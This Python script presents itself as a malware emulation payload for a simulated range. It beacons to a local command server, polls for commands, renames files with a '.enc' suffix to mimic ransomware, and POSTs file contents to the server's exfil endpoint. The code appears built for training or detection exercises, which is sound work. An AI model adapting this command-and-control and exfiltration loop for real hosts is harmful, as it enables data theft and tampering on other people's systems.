#!/usr/bin/env python3
"""
Active Malware Payload for Emulation
Connects to local C2, polls for commands, and executes effects on the War Zone.
"""

import sys
import os
import time
import random
import urllib.request
import urllib.error
import argparse

def get_files(directory):
    return [os.path.join(directory, f) for f in os.listdir(directory)
            if os.path.isfile(os.path.join(directory, f))
            and not f.endswith(".enc")
            and not f.startswith(".")]

def run_payload(c2_port, target_dir):
    c2_url = f"http://127.0.0.1:{c2_port}"
    print(f"[MALWARE] Started. C2: {c2_url} Target: {target_dir}")

    # Beacon
    try:
        urllib.request.urlopen(f"{c2_url}/beacon?id={os.getpid()}", timeout=1)
    except: pass

    while True:
        try:
            # Poll for command
            try:
                with urllib.request.urlopen(f"{c2_url}/command", timeout=1) as response:
                    cmd = response.read().decode('utf-8').strip()
            except urllib.error.URLError:
                cmd = "SLEEP"

            if cmd == "ENCRYPT":
                print("[MALWARE] Encrypting...")
                files = get_files(target_dir)
                if files:
                    target = random.choice(files)
                    try:
                        os.rename(target, target + ".enc")
                        # Notify C2 of success
                        urllib.request.urlopen(f"{c2_url}/log?msg=Encrypted_{os.path.basename(target)}", timeout=1)
                    except: pass

            elif cmd == "EXFIL":
                print("[MALWARE] Exfiltrating...")
                # Target critical files if they exist, else random
                critical_dir = os.path.join(target_dir, "critical")
                target = None

                if os.path.exists(critical_dir):
                    crit_files = [os.path.join(critical_dir, f) for f in os.listdir(critical_dir)]
                    if crit_files: target = random.choice(crit_files)

                if not target:
                    files = get_files(target_dir)
                    if files: target = random.choice(files)

                if target:
                    try:
                        with open(target, 'rb') as f:
                            data = f.read()

                        # Send data to C2
                        req = urllib.request.Request(f"{c2_url}/exfil", data=data, method='POST')
                        urllib.request.urlopen(req, timeout=1)
                    except: pass

            elif cmd == "KILL":
                sys.exit(0)

            time.sleep(2)

        except KeyboardInterrupt:
            break
        except Exception:
            time.sleep(2)

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--port", type=int, required=True)
    parser.add_argument("--target", type=str, required=True)
    args = parser.parse_args()

    run_payload(args.port, args.target)
